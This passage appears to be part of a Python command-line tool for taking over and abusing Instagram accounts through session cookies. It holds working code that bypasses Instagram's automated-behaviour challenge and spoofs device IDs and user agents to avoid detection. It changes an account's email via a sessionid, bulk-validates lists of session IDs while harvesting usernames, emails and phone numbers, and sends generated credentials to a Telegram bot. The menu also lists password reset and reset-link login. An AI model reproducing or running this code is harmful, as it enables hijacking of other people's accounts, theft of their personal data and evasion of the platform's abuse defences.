    Check = requests.get('https://www.instagram.com/api/v1/challenge/web/', params={'next': '/_n/emaillogindlink%3Fuid%3D1tz1p2w%26token%3DdFBV7z%26auto_send%3D0%26is_caa%3D1',}, headers=headers)
    if "We suspect automated behavior on your account" in Check.text:
        print("THIS IS DISMISS MESSAGE")
        match = re.search(r'"challenge_context":"([^"]+)"', Check.text)
        challenge_context = match.group(1)
        data = {
            "challenge_context": challenge_context,
            "has_follow_up_screens": "false",
            "nest_data_manifest": "true"
        }
        response = requests.post("https://www.instagram.com/api/v1/bloks/apps/com.instagram.challenge.navigation.take_challenge/", headers=headers, data=data)
        print("DONE SKIP MESSAGE ! ")
    else:
        print("NOT FOUND DISMISS MESSAGE")


# Function for option 11: CHANGING MAIL (FRESH MOOD)
def changing_mail_fresh_mood_code():
    print("Executing: CHANGING MAIL (FRESH MOOD)")
    
    class InstagramEmailChanger:
        def __init__(self):
            self.session = requests.Session()
            self.base_url = "https://i.instagram.com/api/v1"
            
        def clear_console(self):
            os.system('cls' if os.name == 'nt' else 'clear')
        
        def display_header(self):
            self.clear_console()
            print("  Instagram Email Changer Tool")
            print("  Created by 92")
            print()
        
        def generate_DeviceId(self, username):
            """Generate unique Device ID for each attempt"""
            volatile_ID = str(random.randint(10000, 99999))
            m = hashlib.md5()
            m.update(username.encode('utf-8') + volatile_ID.encode('utf-8'))
            return 'android-' + m.hexdigest()[:16]
        
        def generate_random_user_agent(self):
            """Generate random User Agent for each request"""
            android_versions = ["28/9", "29/10", "30/11", "31/12"]
            dpi_options = ["320dpi", "420dpi", "480dpi"]
            resolution_options = ["720x1280", "1080x1920", "1440x2560"]
            
            return f"Instagram 303.0.0.0.59 Android ({random.choice(android_versions)}; {random.choice(dpi_options)}; {random.choice(resolution_options)}; {''.join(random.choices(string.ascii_lowercase+string.digits, k=16))}/{''.join(random.choices(string.ascii_lowercase+string.digits, k=16))}; {''.join(random.choices(string.ascii_lowercase+string.digits, k=16))}; {''.join(random.choices(string.ascii_lowercase+string.digits, k=16))}; {''.join(random.choices(string.ascii_lowercase+string.digits, k=16))}; en_GB;)"
        
        def headers(self):
            """Random headers for each request"""
            headers = {}
            headers['User-Agent'] = self.generate_random_user_agent()
            headers['Host'] = 'i.instagram.com'
            headers['content-type'] = 'application/x-www-form-urlencoded; charset=UTF-8'
            headers['x-fb-http-engine'] = 'Liger'
            headers['Connection'] = 'close'
            headers['X-IG-App-ID'] = '567067343352427'
            headers['X-IG-Device-ID'] = str(uuid.uuid4())
            headers['X-IG-Android-ID'] = f"android-{''.join(random.choices(string.digits, k=16))}"
            return headers
        
        def verify_session(self, sessionid):
            """Verify session validity with better error handling"""
            try:
                response = requests.get(
                    f"{self.base_url}/accounts/current_user/?edit=true",
                    headers=self.headers(),
                    cookies={"sessionid": sessionid},
                    timeout=10
                )
                
                if response.status_code == 200:
                    result = response.json()
                    if "user" in result and "username" in result["user"]:
                        return True, result["user"]["username"], result
                    else:
                        print("[!] Session valid but cannot get user data")
                        return False, None, None
                elif response.status_code == 400:
                    print("[!] Session expired or invalid")
                    return False, None, None
                else:
                    print(f"[!] Verification failed with status: {response.status_code}")
                    return False, None, None
                    
            except requests.exceptions.Timeout:
                print("[!] Timeout while verifying session")
                return False, None, None
            except Exception as e:
                print(f"[!] Error verifying session: {e}")
                return False, None, None
        
        def get_current_email(self, sessionid, username):
            """Get current email"""
            try:
                response = requests.get(
                    f"{self.base_url}/accounts/current_user/?edit=true",
                    headers=self.headers(),
                    cookies={"sessionid": sessionid},
                    timeout=10
                )
                
                if response.status_code == 200:
                    result = response.json()
                    if "user" in result and "email" in result["user"]:
                        return result["user"]["email"]
                return None
            except:
                return None
        
        def change_email_directly(self, sessionid, new_email, username):
            """Change email with security improvements"""
            try:
                # Get current email first
                current_email = self.get_current_email(sessionid, username)
                if current_email:
                    print(f"[*] Current email: {current_email}")
                
                # If new email is same as current
                if current_email == new_email:
                    print("[!] New email is same as current email")
                    return True, new_email
                
                # Wait 5 seconds before sending request
                print("[*] Waiting 5 seconds before sending request...")
                for i in range(5, 0, -1):
                    print(f"[*] Sending in {i} seconds...", end='\r')
                    time.sleep(1)
                print()
                
                # Different data for each attempt
                first_names = ["User", "Test", "Instagram", "Profile", "Account"]
                biographies = ["", "Hello", "Hi there", "Instagram user", ""]
                
                data_payload = {
                    "primary_profile_link_type": "0",
                    "phone_number": "",
                    "username": username,
                    "show_fb_link_on_profile": random.choice(["true", "false"]),
                    "first_name": random.choice(first_names),
                    "_uid": str(random.randint(10000000000, 99999999999)),
                    "device_id": self.generate_DeviceId(username),
                    "biography": random.choice(biographies),
                    "_uuid": str(uuid.uuid4()),
                    "email": new_email
                }
                
                json_payload = json.dumps(data_payload)
                signed_body = f"SIGNATURE.{json_payload}"
                
                print("[*] Sending email change request...")
                
                response = requests.post(
                    f"{self.base_url}/accounts/edit_profile/",
                    headers=self.headers(),
                    cookies={"sessionid": sessionid},
                    data={'signed_body': signed_body},
                    timeout=15
                )
                
                print(f"[*] Response status: {response.status_code}")
                
                if response.status_code == 200:
                    result = response.json()
                    if "user" in result:
                        if "email" in result["user"]:
                            print(f"[+] Email in response: {result['user']['email']}")
                            return True, result["user"]["email"]
                        else:
                            print("[!] Email field missing in response, but profile updated")
                            # Verify the change actually happened
                            time.sleep(2)
                            verified_email = self.get_current_email(sessionid, username)
                            if verified_email == new_email:
                                return True, new_email
                            else:
                                return False, None
                    else:
                        print("[!] No user data in response")
                        return False, None
                elif response.status_code == 400:
                    error_msg = result.get("message", "Unknown error") if "result" in locals() else "Bad Request"
                    print(f"[!] API Error: {error_msg}")
                    return False, None
                else:
                    print(f"[!] HTTP Error: {response.status_code}")
                    return False, None
                    
            except requests.exceptions.Timeout:
                print("[!] Request timeout")
                return False, None
            except Exception as e:
                print(f"[!] Error changing email: {e}")
                return False, None
        
        def change_email_process(self):
            """Main process with improvements"""
            self.display_header()
            
            while True:
                # 1. Get session from user
                sessionid = input("Enter your Instagram sessionid (or 'quit' to exit): ").strip()
                
                if sessionid.lower() == 'quit':
                    break
                
                if not sessionid:
                    print("[!] No sessionid provided.")
                    continue
                
                # 2. Verify session validity
                print("[*] Verifying session...")
                valid, username, user_data = self.verify_session(sessionid)
                
                if not valid:
                    print("[!] Invalid sessionid. Please check and try again.")
                    continue
                
                print(f"[+] Successfully logged in as: @{username}")
                
                # 3. Get new email
                new_email = input("\nEnter the new email: ").strip()
                
                if not new_email or "@" not in new_email:
                    print("[!] Invalid email format.")
                    continue
                
                # 4. Change email
                print("\n[*] Starting email change process...")
                success, changed_email = self.change_email_directly(sessionid, new_email, username)
                
                if success:
                    print("[✅] Email changed successfully!")
                    print(f"[📧] New email: {changed_email}")
                else:
                    print("[❌] Failed to change email.")
                    print("[!] Possible reasons: Rate limiting, session issue, or Instagram restrictions")
                    
                    # Ask if user wants to retry
                    retry = input("\nDo you want to try again? (y/n): ").strip().lower()
                    if retry == 'y':
                        continue
                
                print("\n" + "=" * 50)
                continue_choice = input("Change another email? (y/n): ").strip().lower()
                if continue_choice != 'y':
                    break
            
            print("[+] Tool finished. Goodbye!")

    changer = InstagramEmailChanger()
    changer.change_email_process()


# Function for option 12: RANDOM USER,PASS,MAIL (UNCREATED ACC)
def random_user_pass_mail_code():
    print("Executing: RANDOM USER,PASS,MAIL (UNCREATED ACC)")
    
    def get_user_credentials():
        print("=== Telegram Bot Setup ===")
        bot_token = input("Enter your Bot Token: ").strip()
        chat_id = input("Enter your Chat ID: ").strip()
        return bot_token, chat_id

    def generate_random_username(length=10):
        letters = string.ascii_lowercase + string.digits
        return ''.join(random.choice(letters) for i in range(length))

    def generate_random_password(length=12):
        characters = string.ascii_letters + string.digits + '!@#$%'
        return ''.join(random.choice(characters) for i in range(length))

    def generate_random_email():
        username_length = random.randint(15, 20)
        username = ''.join(random.choice(string.ascii_lowercase + string.digits) for i in range(username_length))
        
        while username[0].isdigit():
            username = ''.join(random.choice(string.ascii_lowercase + string.digits) for i in range(username_length))
        
        return f"{username}@gmail.com"

    def test_bot_connection(bot_token):
        try:
            url = f"https://api.telegram.org/bot{bot_token}/getMe"
            response = requests.get(url, timeout=10)
            if response.status_code == 200:
                print("Bot connection successful")
                return True
            else:
                print(f"Invalid bot token: {response.status_code}")
                return False
        except Exception as e:
            print(f"Connection error: {e}")
            return False

    def send_telegram_message(bot_token, chat_id, message):
        url = f"https://api.telegram.org/bot{bot_token}/sendMessage"
        payload = {
            'chat_id': chat_id,
            'text': message,
            'parse_mode': 'HTML'
        }
        
        try:
            print("Sending message...")
            response = requests.post(url, data=payload, timeout=30)
            if response.status_code == 200:
                print("Message sent successfully!")
                return True
            else:
                print(f"Sending failed: {response.status_code}")
                print(f"Response: {response.text}")
                return False
        except requests.exceptions.Timeout:
            print("Timeout - check internet connection")
            return False
        except requests.exceptions.ConnectionError:
            print("Internet connection error")
            return False
        except Exception as e:
            print(f"Unexpected error: {e}")
            return False

    def main_random_generator():
        print("Starting random data generator...")
        
        bot_token, chat_id = get_user_credentials()
        
        if not test_bot_connection(bot_token):
            print("Generating data without Telegram sending...")
            send_to_telegram = False
        else:
            send_to_telegram = True
        
        print("Generating random data...")
        username = generate_random_username()
        password = generate_random_password()
        email = generate_random_email()
        
        message = f"""user:{username}
pass:{password}
email:{email}
session:"""
        
        print("\n" + "=" * 50)
        print("Generated Data:")
        print("=" * 50)
        print(f"user: {username}")
        print(f"pass: {password}")
        print(f"email: {email}")
        print(f"Email length: {len(email.split('@')[0])} characters")
        print(f"session: ")
        print("=" * 50)
        
        if send_to_telegram:
            print("\nAttempting to send to Telegram...")
            send_telegram_message(bot_token, chat_id, message)
        else:
            print("\nNot sent to Telegram due to connection issues")
            print("Please check:")
            print("   - Bot token is correct")
            print("   - Chat ID is correct")
            print("   - Internet connection is working")
        
        print("\nProgram completed")

    main_random_generator()


# Function for option 13: SESSIONS VALIDATOR
def sessions_validator_code():
    print("Executing: SESSIONS VALIDATOR")
    
    def get_headers(session_id, type_):
        if type_ == "info":
            device_id = f"android-{uuid.uuid4().hex[:16]}"
            return {
                "User-Agent": "Instagram 113.0.0.39.122 Android (24/5.0; 515dpi; 1440x2416; huawei/google; Nexus 6P; angler; angler; en_US)",
                "Accept": "/",
                "Cookie": f"sessionid={session_id}",
                "Accept-Language": "en-US",
                "Accept-Encoding": "gzip, deflate",
                "X-IG-Capabilities": "3brTvw==",
                "X-IG-Connection-Type": "WIFI",
                "X-IG-App-ID": "567067343352427",
                "X-IG-Device-ID": device_id,
                "X-IG-Android-ID": device_id
            }
        else:
            return {
                "user-agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/132.0.0.0 Safari/537.36",
                "x-csrftoken": "w5GUCheI7WvoRiDA9Xlr6V",
                "x-web-session-id": "vsoplz:jg4v4g:fdi5ne",
                "Accept-Language": "en-US",
                "X-IG-App-ID": "567067343352427",
                "Cookie": f"sessionid={session_id}"
            }

    def get_user_info(session_id):
        try:
            headers = get_headers(session_id, "info")
            response = requests.get(
                "https://i.instagram.com/api/v1/accounts/current_user/?edit=true",
                headers=headers
            )
            if response.status_code == 200:
                return response.json()['user']
            else:
                print(f"[!] Failed to fetch user info: {response.status_code}, {response.text}")
                return None
                
        except Exception as e:
            print(f"[!] Error: {str(e)}")
            return None

    def validate_single_session():
        print("\n" + "="*50)
        print("SINGLE SESSION VALIDATION")
        print("="*50)
        
        session_id = input("Enter session ID: ").strip()
        
        if not session_id:
            print("[!] No session ID provided!")
            return
        
        print("\n[*] Validating session...")
        
        user_info = get_user_info(session_id)
        
        if user_info:
            print("\n[✅] SESSION IS VALID!")
            print(f"[📱] Username: @{user_info.get('username', 'N/A')}")
            print(f"[👤] Full Name: {user_info.get('full_name', 'N/A')}")
            print(f"[📧] Email: {user_info.get('email', 'N/A')}")
            print(f"[📞] Phone: {user_info.get('phone_number', 'N/A')}")
            print(f"[🆔] User ID: {user_info.get('pk', 'N/A')}")
            print(f"[👥] Followers: {user_info.get('follower_count', 'N/A')}")
            print(f"[📊] Following: {user_info.get('following_count', 'N/A')}")
        else:
            print("\n[❌] SESSION IS INVALID OR EXPIRED!")

    def validate_multi_sessions():
        print("\n" + "="*50)
        print("MULTI SESSIONS VALIDATION")
        print("="*50)
        
        filename = input("Enter filename containing sessions: ").strip()
        
        if not filename:
            print("[!] No filename provided!")
            return
        
        if not os.path.exists(filename):
            print(f"[!] File '{filename}' not found!")
            return
        
        try:
            with open(filename, 'r', encoding='utf-8') as file:
                sessions = [line.strip() for line in file if line.strip()]
        except Exception as e:
            print(f"[!] Error reading file: {e}")
            return
        
        if not sessions:
            print("[!] No sessions found in file!")
            return
        
        print(f"\n[*] Found {len(sessions)} sessions to validate...")
        
        valid_sessions = []
        invalid_sessions = []
        
        for i, session in enumerate(sessions, 1):
            print(f"[{i}/{len(sessions)}] Validating session...", end='\r')
            
            user_info = get_user_info(session)
            
            if user_info:
                username = user_info.get('username', 'Unknown')
                valid_sessions.append({
                    'session': session,
                    'username': username,
                    'user_id': user_info.get('pk', 'N/A')
                })
                print(f"[{i}/{len(sessions)}] ✅ Valid: @{username}")
            else:
                invalid_sessions.append(session)
                print(f"[{i}/{len(sessions)}] ❌ Invalid session")
        
        # Save results to files
        timestamp = datetime.now().strftime("%Y%m%d_%H%M%S")
        valid_filename = f"valid_sessions_{timestamp}.txt"
        invalid_filename = f"invalid_sessions_{timestamp}.txt"
        
        # Save valid sessions
        with open(valid_filename, 'w', encoding='utf-8') as f:
            for item in valid_sessions:
                f.write(f"Session: {item['session']}\n")
                f.write(f"Username: @{item['username']}\n")
                f.write(f"User ID: {item['user_id']}\n")
                f.write("-" * 50 + "\n")
        
        # Save invalid sessions
        with open(invalid_filename, 'w', encoding='utf-8') as f:
            for session in invalid_sessions:
                f.write(f"{session}\n")
        
        print("\n" + "="*50)
        print("VALIDATION COMPLETED!")
        print("="*50)
        print(f"✅ Valid sessions: {len(valid_sessions)}")
        print(f"❌ Invalid sessions: {len(invalid_sessions)}")
        print(f"📁 Valid sessions saved to: {valid_filename}")
        print(f"📁 Invalid sessions saved to: {invalid_filename}")

    while True:
        print("\n" + "="*50)
        print("SESSIONS VALIDATOR MENU")
        print("="*50)
        print("1 - SINGLE SESSION")
        print("2 - MULTI SESSIONS (FROM FILE)")
        print("3 - Back to Main Menu")
        print("="*50)
        
        choice = input("Select option (1-3): ").strip()
        
        if choice == '1':
            validate_single_session()
        elif choice == '2':
            validate_multi_sessions()
        elif choice == '3':
            print("\n[*] Returning to main menu...")
            break
        else:
            print("\n[!] Invalid choice! Please select 1, 2, or 3.")
        
        input("\nPress Enter to continue...")


# Create a dictionary to map choices to functions
choices = {
    '1': get_session_code,
    '2': get_session_acception_code,
    '3': convert_session_web_to_api_code,
    '4': convert_session_web_to_api_via_mid_code,
    '5': accept_terms_code,
    '6': removing_former_users,
    '7': reset_password_code,
    '8': change_bio_code,
    '9': reset_link,
    '10': skipping_dismiss_code,
    '11': changing_mail_fresh_mood_code,
    '12': random_user_pass_mail_code,
    '13': sessions_validator_code,
}

# Display the menu
def show_menu():
    print("Please select an option:")
    print("1- GET SESSION (CODE)")
    print("2- GET SESSION (ACCEPTIION)")
    print("3- CONVERT SESSION (WEB TO API)")
    print("4- CONVERT SESSION (WEB TO API VIA MID)")
    print("5- ACCEPT TRMES")
    print("6- REMOVING FORMER USERS (API SESSION ONLY)")
    print("7- RESET PW (INACTIVE & ACTIVE ACC)")
    print("8- CHANGE BIO (API SESSION ONLY)")
    print("9- LOGIN USEING RESET LINK (CHANGE PASSWORD)")
    print("10- SKIPPING DISMISS")
    print("11- CHANGING MAIL (FRESH MOOD)")
    print("12- RANDOM USER,PASS,MAIL (UNCREATED ACC)")
    print("13- SESSIONS VALIDATOR")

# Main loop to handle user interaction
def main():
    while True:
        show_menu()
        choice = input("Enter your choice (1-13) or 'q' to quit: ")
        
        if choice.lower() == 'q':
            print("Exiting the program. Goodbye!")
            break

        if choice in choices:
            # Call the corresponding function from the dictionary
            try:
                choices[choice]()
            except:
                print("[-] Can't Reset Password")
        else:
            print("Invalid choice. Please enter a number from 1 to 13.")
            
        print("-" * 30) # Separator for clarity

if __name__ == "__main__":

    main()
